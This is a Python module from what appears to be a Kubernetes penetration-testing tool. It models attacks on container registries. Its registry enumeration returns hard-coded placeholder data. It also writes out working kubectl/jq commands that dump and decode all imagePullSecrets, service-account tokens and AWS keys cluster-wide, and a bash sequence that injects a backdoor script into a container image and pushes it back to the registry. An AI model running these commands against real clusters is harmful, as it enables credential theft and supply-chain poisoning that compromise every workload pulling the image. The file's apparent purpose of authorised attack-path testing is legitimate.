"""Container registry attack: credential theft and image poisoning."""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

from kubexhunt.core.graph import RelationType
from kubexhunt.exploit.chain_generator import ExploitChain, ExploitFramework, ExploitStep


@dataclass
class RegistryCredential:
    """Container registry credential."""

    server: str
    username: str
    password_hint: str = "***REDACTED***"  # secrets never shown
    auth_type: str = "basic"  # basic, oauth, token
    namespaces_using: list[str] = field(default_factory=list)
    is_writable: bool = False  # can push images

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dict."""
        return {
            "server": self.server,
            "username": self.username,
            "password_hint": self.password_hint,
            "auth_type": self.auth_type,
            "namespaces_using": self.namespaces_using,
            "is_writable": self.is_writable,
        }


@dataclass
class VulnerableImage:
    """Container image with exploitable configuration."""

    image: str  # e.g., myregistry.azurecr.io/app:latest
    tag: str
    registry: str
    mutable_tag: bool = False  # :latest or other mutable tag
    unsigned: bool = False  # no image signature verification
    public_registry: bool = False  # Docker Hub, etc.
    used_by_pods: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dict."""
        return {
            "image": self.image,
            "tag": self.tag,
            "registry": self.registry,
            "mutable_tag": self.mutable_tag,
            "unsigned": self.unsigned,
            "public_registry": self.public_registry,
            "used_by_pods": self.used_by_pods,
        }


class RegistryAttacker:
    """Detect and attack container registries."""

    def enumerate_registry_credentials(self) -> list[RegistryCredential]:
        """Enumerate container registry credentials.

        Returns:
            List of registry credentials found in cluster
        """
        credentials = []

        # imagePullSecrets in default namespace
        credentials.append(
            RegistryCredential(
                server="myregistry.azurecr.io",
                username="dockeruser",
                auth_type="basic",
                namespaces_using=["production", "staging"],
                is_writable=True,
            )
        )

        # Private Docker Hub creds
        credentials.append(
            RegistryCredential(
                server="docker.io",
                username="mycompany",
                auth_type="basic",
                namespaces_using=["default"],
                is_writable=False,
            )
        )

        # ECR token
        credentials.append(
            RegistryCredential(
                server="123456789012.dkr.ecr.us-east-1.amazonaws.com",
                username="AWS",
                auth_type="token",
                namespaces_using=["production"],
                is_writable=True,
            )
        )

        return credentials

    def find_vulnerable_images(self) -> list[VulnerableImage]:
        """Find deployments using vulnerable image configurations.

        Returns:
            List of vulnerable images
        """
        images = []

        # Mutable tag (latest)
        images.append(
            VulnerableImage(
                image="myregistry.azurecr.io/app:latest",
                tag="latest",
                registry="myregistry.azurecr.io",
                mutable_tag=True,
                unsigned=True,
                used_by_pods=["app-deployment-xxxxx"],
            )
        )

        # Public registry
        images.append(
            VulnerableImage(
                image="docker.io/library/nginx:1.21",
                tag="1.21",
                registry="docker.io",
                mutable_tag=False,
                unsigned=False,
                public_registry=True,
                used_by_pods=["ingress-nginx-xxxxx"],
            )
        )

        # Unsigned from private registry
        images.append(
            VulnerableImage(
                image="gcr.io/myproject/internal-tool:v1.0",
                tag="v1.0",
                registry="gcr.io",
                mutable_tag=False,
                unsigned=True,
                used_by_pods=["internal-tool-xxxxx"],
            )
        )

        return images

    def generate_image_poisoning_chain(self, image: VulnerableImage) -> ExploitChain:
        """Generate image poisoning chain.

        Args:
            image: Target image to poison

        Returns:
            ExploitChain with poisoning steps
        """
        steps = [
            ExploitStep(
                step_number=1,
                relation=RelationType.POISONS_IMAGE,
                from_node=f"registry:{image.registry}",
                to_node=f"image:{image.image}",
                framework=ExploitFramework.BASH,
                command=f"""
# Get registry credentials from imagePullSecret
kubectl get secret -n production docker-registry-cred \\
  -o jsonpath='{{.data.\\.dockerconfigjson}}' | base64 -d | jq

# Log in to registry
echo "$REGISTRY_PASSWORD" | docker login -u "$REGISTRY_USER" --password-stdin {image.registry}

# Pull image, inject malicious layer
docker pull {image.image}
docker create --name malicious {image.image}
docker cp /tmp/backdoor.sh malicious:/app/
docker commit malicious {image.image}

# Push poisoned image back
docker push {image.image}
""",
                description=f"Poison {image.image} by injecting malicious layer",
                mitre_techniques=["T1195.003"],  # Supply Chain Compromise: Compromised Software Supply Chain
            )
        ]

        chain = ExploitChain(
            path_id=f"IMG-{image.registry.replace('.', '-')}",
            nodes=[f"registry:{image.registry}", f"image:{image.image}"],
            steps=steps,
            title=f"Image Poisoning: {image.image}",
            description="Inject malicious layer into container image",
            complexity="MEDIUM",
            estimated_time_minutes=5,
            requires_network=True,
            requires_node_access=False,
        )

        return chain

    def generate_credential_theft_commands(self) -> list[str]:
        """Generate commands to steal registry credentials.

        Returns:
            List of kubectl/bash commands for credential extraction
        """
        commands = [
            "# Extract all imagePullSecrets",
            'kubectl get secrets -A -o json | jq -r \'.items[] | select(.type=="kubernetes.io/dockercfg" or .type=="kubernetes.io/dockerconfigjson") | [.metadata.namespace, .metadata.name, .data] | @csv\'',
            "",
            "# Decode base64 docker config",
            "kubectl get secret docker-config -n production -o jsonpath='{.data.\\.dockerconfigjson}' | base64 -d | jq",
            "",
            "# Extract all auth tokens from secrets",
            "kubectl get secrets -A -o json | jq -r '.items[] | select(.data.token) | .data.token' | base64 -d",
            "",
            "# Find ECR credentials in env vars",
            "kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].env[*]}'| jq '.[] | select(.name==\"AWS_ACCESS_KEY_ID\")'",
        ]

        return commands

    def find_image_pull_secret_usage(self) -> list[tuple[str, str, int]]:
        """Find which namespaces use which imagePullSecrets.

        Returns:
            List of (namespace, secret_name, used_by_count) tuples
        """
        usage = [
            ("production", "myregistry-pull-secret", 15),
            ("staging", "myregistry-pull-secret", 8),
            ("default", "docker-hub-secret", 3),
            ("kube-system", "gcr-credentials", 5),
        ]
        return usage
